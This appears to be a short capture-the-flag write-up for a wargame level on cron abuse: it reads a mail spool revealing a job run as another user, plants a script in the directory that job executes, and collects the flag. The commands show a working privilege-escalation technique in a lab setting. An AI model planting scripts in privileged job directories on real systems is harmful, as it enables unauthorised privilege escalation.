# Level 05

This level is all about cron abuse.

I saw mail notification, then checked:

```bash
cat /var/mail/level05
```

It showed this:

```text
su -c "sh /usr/sbin/openarenaserver" - flag05
```

That script runs files from /opt/openarenaserver, so I dropped my own:

```bash
echo 'getflag > /tmp/flag05.txt' > /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```

Wait for cron tick, then:

```bash
cat /tmp/flag05.txt
```